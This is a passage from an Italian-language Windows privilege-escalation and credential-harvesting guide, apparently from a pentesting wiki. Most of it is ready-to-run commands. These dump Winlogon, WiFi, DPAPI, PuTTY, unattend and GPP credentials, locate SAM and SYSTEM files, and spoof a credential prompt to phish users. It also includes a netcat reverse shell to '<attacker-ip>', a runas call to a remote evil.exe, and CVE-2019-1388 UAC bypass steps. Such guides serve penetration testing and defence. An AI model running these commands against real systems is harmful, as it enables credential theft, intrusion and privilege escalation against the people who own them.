Per avviare facilmente bash come root, puoi provare `--default-user root`

Puoi esplorare il filesystem `WSL` nella cartella `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenziali di Windows

### Credenziali di Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestore delle credenziali / Vault di Windows

Da [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Il Vault di Windows memorizza le credenziali degli utenti per server, siti web e altri programmi che **Windows** può **accedere automaticamente per gli utenti**. A prima vista, questo potrebbe sembrare che ora gli utenti possano memorizzare le proprie credenziali di Facebook, Twitter, Gmail, ecc., in modo che accedano automaticamente tramite i browser. Ma non è così.

Il Vault di Windows memorizza le credenziali che Windows può utilizzare per accedere automaticamente agli utenti, il che significa che qualsiasi **applicazione Windows che necessita di credenziali per accedere a una risorsa** (server o sito web) **può utilizzare questo Gestore delle credenziali** e il Vault di Windows e utilizzare le credenziali fornite invece che gli utenti debbano inserire continuamente nome utente e password.

A meno che le applicazioni non interagiscano con il Gestore delle credenziali, non penso sia possibile per loro utilizzare le credenziali per una data risorsa. Quindi, se la tua applicazione desidera utilizzare il vault, dovrebbe in qualche modo **comunicare con il gestore delle credenziali e richiedere le credenziali per quella risorsa** dal vault di archiviazione predefinito.

Usa `cmdkey` per elencare le credenziali memorizzate sulla macchina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Puoi quindi utilizzare `runas` con l'opzione `/savecred` per utilizzare le credenziali salvate. Il seguente esempio chiama un binario remoto tramite una condivisione SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Utilizzando `runas` con un set di credenziali fornito.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Nota che mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o dal [modulo Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

L'**API di Protezione Dati (DPAPI)** fornisce un metodo per la crittografia simmetrica dei dati, utilizzato prevalentemente all'interno del sistema operativo Windows per la crittografia simmetrica delle chiavi private asimmetriche. Questa crittografia sfrutta un segreto dell'utente o del sistema per contribuire significativamente all'entropia.

**DPAPI consente la crittografia delle chiavi attraverso una chiave simmetrica derivata dai segreti di accesso dell'utente**. In scenari che coinvolgono la crittografia del sistema, utilizza i segreti di autenticazione del dominio del sistema.

Le chiavi RSA dell'utente crittografate, utilizzando DPAPI, sono memorizzate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove `{SID}` rappresenta il [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) dell'utente. **La chiave DPAPI, co-locata con la chiave master che protegge le chiavi private dell'utente nello stesso file**, consiste tipicamente di 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è ristretto, impedendo l'elenco dei suoi contenuti tramite il comando `dir` in CMD, anche se può essere elencata tramite PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puoi usare il **modulo mimikatz** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decrittarlo.

I **file di credenziali protetti dalla password principale** si trovano solitamente in:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puoi usare il **modulo mimikatz** `dpapi::cred` con il corretto `/masterkey` per decriptare.\
Puoi **estrarre molti DPAPI** **masterkeys** dalla **memoria** con il modulo `sekurlsa::dpapi` (se sei root).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenziali PowerShell

Le **credenziali PowerShell** sono spesso utilizzate per **scripting** e compiti di automazione come un modo per memorizzare comodamente credenziali criptate. Le credenziali sono protette usando **DPAPI**, il che significa tipicamente che possono essere decriptate solo dallo stesso utente sullo stesso computer su cui sono state create.

Per **decriptare** una credenziale PS dal file che la contiene puoi fare:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connessioni RDP Salvate

Puoi trovarle in `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandi Eseguiti Recentemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestore delle credenziali di Desktop remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa il modulo **Mimikatz** `dpapi::rdg` con il corretto `/masterkey` per **decriptare qualsiasi file .rdg**\
Puoi **estrarre molti masterkey DPAPI** dalla memoria con il modulo `sekurlsa::dpapi` di Mimikatz

### Sticky Notes

Le persone spesso usano l'app StickyNotes sui workstation Windows per **salvare password** e altre informazioni, senza rendersi conto che si tratta di un file di database. Questo file si trova in `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` ed è sempre utile cercarlo ed esaminarlo.

### AppCmd.exe

**Nota che per recuperare le password da AppCmd.exe devi essere Amministratore e eseguire con un livello di alta integrità.**\
**AppCmd.exe** si trova nella directory `%systemroot%\system32\inetsrv\` .\
Se questo file esiste, allora è possibile che alcune **credenziali** siano state configurate e possano essere **recuperate**.

Questo codice è stato estratto da [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Controlla se `C:\Windows\CCM\SCClient.exe` esiste .\
Gli installer vengono **eseguiti con privilegi di SYSTEM**, molti sono vulnerabili a **DLL Sideloading (Info da** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## File e Registro (Credenziali)

### Credenziali Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chiavi Host SSH di Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Chiavi SSH nel registro

Le chiavi private SSH possono essere memorizzate all'interno della chiave di registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi dovresti controllare se c'è qualcosa di interessante lì:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se trovi un'entrata all'interno di quel percorso, probabilmente sarà una chiave SSH salvata. È memorizzata in modo crittografato ma può essere facilmente decrittografata utilizzando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Ulteriori informazioni su questa tecnica qui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se il servizio `ssh-agent` non è in esecuzione e desideri che si avvii automaticamente all'avvio, esegui:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!NOTE]
> Sembra che questa tecnica non sia più valida. Ho provato a creare alcune chiavi ssh, aggiungerle con `ssh-add` e accedere tramite ssh a una macchina. Il registro HKCU\Software\OpenSSH\Agent\Keys non esiste e procmon non ha identificato l'uso di `dpapi.dll` durante l'autenticazione della chiave asimmetrica.

### File non presidiati
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Puoi anche cercare questi file utilizzando **metasploit**: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backup di SAM e SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenziali Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Cerca un file chiamato **SiteList.xml**

### Cached GPP Pasword

Una funzionalità era precedentemente disponibile che consentiva il deployment di account amministratore locali personalizzati su un gruppo di macchine tramite Group Policy Preferences (GPP). Tuttavia, questo metodo presentava significative vulnerabilità di sicurezza. In primo luogo, gli oggetti di Criteri di Gruppo (GPO), memorizzati come file XML in SYSVOL, potevano essere accessibili da qualsiasi utente di dominio. In secondo luogo, le password all'interno di questi GPP, crittografate con AES256 utilizzando una chiave predefinita documentata pubblicamente, potevano essere decrittografate da qualsiasi utente autenticato. Questo rappresentava un serio rischio, poiché poteva consentire agli utenti di ottenere privilegi elevati.

Per mitigare questo rischio, è stata sviluppata una funzione per cercare file GPP memorizzati localmente contenenti un campo "cpassword" che non è vuoto. Una volta trovato un file del genere, la funzione decrittografa la password e restituisce un oggetto PowerShell personalizzato. Questo oggetto include dettagli sul GPP e sulla posizione del file, aiutando nell'identificazione e nella risoluzione di questa vulnerabilità di sicurezza.

Cerca in `C:\ProgramData\Microsoft\Group Policy\history` o in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (precedente a W Vista)_ per questi file:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Per decrittografare il cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Utilizzando crackmapexec per ottenere le password:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configurazione Web di IIS
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Esempio di web.config con credenziali:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenziali OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Registri
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Chiedere credenziali

Puoi sempre **chiedere all'utente di inserire le sue credenziali o anche le credenziali di un altro utente** se pensi che possa conoscerle (nota che **chiedere** direttamente al cliente le **credenziali** è davvero **rischioso**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possibili nomi di file contenenti credenziali**

File noti che qualche tempo fa contenevano **password** in **chiaro** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Cerca tutti i file proposti:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenziali nel Cestino

Dovresti anche controllare il Cestino per cercare credenziali al suo interno

Per **recuperare password** salvate da diversi programmi puoi usare: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### All'interno del registro

**Altre possibili chiavi di registro con credenziali**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Estrai le chiavi openssh dal registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Cronologia dei Browser

Dovresti controllare i db dove sono memorizzate le password di **Chrome o Firefox**.\
Controlla anche la cronologia, i segnalibri e i preferiti dei browser, quindi forse alcune **password sono** memorizzate lì.

Strumenti per estrarre password dai browser:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Sovrascrittura di DLL COM**

**Component Object Model (COM)** è una tecnologia integrata nel sistema operativo Windows che consente l'**intercomunicazione** tra componenti software di lingue diverse. Ogni componente COM è **identificato tramite un ID di classe (CLSID)** e ogni componente espone funzionalità tramite una o più interfacce, identificate tramite ID di interfaccia (IIDs).

Le classi e le interfacce COM sono definite nel registro sotto **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** e **HKEY\_**_**CLASSES\_**_**ROOT\Interface** rispettivamente. Questo registro è creato unendo **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

All'interno dei CLSID di questo registro puoi trovare il registro figlio **InProcServer32** che contiene un **valore predefinito** che punta a una **DLL** e un valore chiamato **ThreadingModel** che può essere **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single o Multi) o **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Fondamentalmente, se puoi **sovrascrivere una delle DLL** che verranno eseguite, potresti **escalare i privilegi** se quella DLL verrà eseguita da un utente diverso.

Per sapere come gli attaccanti utilizzano il COM Hijacking come meccanismo di persistenza, controlla:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Ricerca generica di password in file e registro**

**Cerca nei contenuti dei file**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Cerca un file con un certo nome di file**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Cerca nel registro chiavi e password**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Strumenti che cercano password

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **è un plugin msf** che ho creato per **eseguire automaticamente ogni modulo POST di metasploit che cerca credenziali** all'interno della vittima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) cerca automaticamente tutti i file contenenti password menzionati in questa pagina.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) è un altro ottimo strumento per estrarre password da un sistema.

Lo strumento [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) cerca **sessioni**, **nomi utente** e **password** di diversi strumenti che salvano questi dati in chiaro (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Immagina che **un processo in esecuzione come SYSTEM apra un nuovo processo** (`OpenProcess()`) con **accesso completo**. Lo stesso processo **crea anche un nuovo processo** (`CreateProcess()`) **con privilegi bassi ma ereditando tutti i gestori aperti del processo principale**.\
Quindi, se hai **accesso completo al processo con privilegi bassi**, puoi afferrare il **gestore aperto al processo privilegiato creato** con `OpenProcess()` e **iniettare un shellcode**.\
[Leggi questo esempio per ulteriori informazioni su **come rilevare e sfruttare questa vulnerabilità**.](leaked-handle-exploitation.md)\
[Leggi questo **altro post per una spiegazione più completa su come testare e abusare di più gestori aperti di processi e thread ereditati con diversi livelli di permessi (non solo accesso completo)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

I segmenti di memoria condivisa, noti come **pipe**, consentono la comunicazione tra processi e il trasferimento di dati.

Windows fornisce una funzionalità chiamata **Named Pipes**, che consente a processi non correlati di condividere dati, anche su reti diverse. Questo assomiglia a un'architettura client/server, con ruoli definiti come **named pipe server** e **named pipe client**.

Quando i dati vengono inviati attraverso una pipe da un **client**, il **server** che ha impostato la pipe ha la possibilità di **assumere l'identità** del **client**, a condizione che abbia i diritti necessari **SeImpersonate**. Identificare un **processo privilegiato** che comunica tramite una pipe che puoi imitare offre l'opportunità di **ottenere privilegi più elevati** adottando l'identità di quel processo una volta che interagisce con la pipe che hai stabilito. Per istruzioni su come eseguire un attacco del genere, puoi trovare guide utili [**qui**](named-pipe-client-impersonation.md) e [**qui**](./#from-high-integrity-to-system).

Inoltre, il seguente strumento consente di **intercettare una comunicazione di named pipe con uno strumento come burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e questo strumento consente di elencare e vedere tutte le pipe per trovare privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitoring Command Lines for passwords**

Quando ottieni una shell come utente, potrebbero esserci attività pianificate o altri processi in esecuzione che **passano credenziali sulla riga di comando**. Lo script sottostante cattura le righe di comando dei processi ogni due secondi e confronta lo stato attuale con lo stato precedente, producendo eventuali differenze.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Furto di password dai processi

## Da Utente a Basso Privilegio a NT\AUTHORITY SYSTEM (CVE-2019-1388) / Bypass UAC

Se hai accesso all'interfaccia grafica (tramite console o RDP) e UAC è abilitato, in alcune versioni di Microsoft Windows è possibile eseguire un terminale o qualsiasi altro processo come "NT\AUTHORITY SYSTEM" da un utente non privilegiato.

Questo rende possibile l'escalation dei privilegi e il bypass di UAC allo stesso tempo con la stessa vulnerabilità. Inoltre, non è necessario installare nulla e il binario utilizzato durante il processo è firmato e rilasciato da Microsoft.

Alcuni dei sistemi interessati sono i seguenti:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Per sfruttare questa vulnerabilità, è necessario eseguire i seguenti passaggi:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Hai tutti i file e le informazioni necessarie nel seguente repository GitHub:

https://github.com/jas502n/CVE-2019-1388

## Da Administrator Medium a High Integrity Level / UAC Bypass

Leggi questo per **imparare sugli Integrity Levels**:

{{#ref}}
integrity-levels.md
{{#endref}}

Poi **leggi questo per imparare su UAC e sugli UAC bypass:**

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## **Da High Integrity a System**

### **Nuovo servizio**

Se stai già eseguendo un processo ad alta integrità, il **passaggio a SYSTEM** può essere facile semplicemente **creando ed eseguendo un nuovo servizio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Da un processo ad alta integrità potresti provare a **abilitare le voci di registro AlwaysInstallElevated** e **installare** una reverse shell utilizzando un _**.msi**_ wrapper.\
[Maggiori informazioni sulle chiavi di registro coinvolte e su come installare un pacchetto _.msi_ qui.](./#alwaysinstallelevated)

### Privilegi High + SeImpersonate a System

**Puoi** [**trovare il codice qui**](seimpersonate-from-high-to-system.md)**.**

### Da SeDebug + SeImpersonate a privilegi di token completi

Se hai quei privilegi di token (probabilmente li troverai in un processo già ad alta integrità), sarai in grado di **aprire quasi qualsiasi processo** (processi non protetti) con il privilegio SeDebug, **copiare il token** del processo e creare un **processo arbitrario con quel token**.\
Utilizzando questa tecnica di solito è **selezionato qualsiasi processo in esecuzione come SYSTEM con tutti i privilegi di token** (_sì, puoi trovare processi SYSTEM senza tutti i privilegi di token_).\
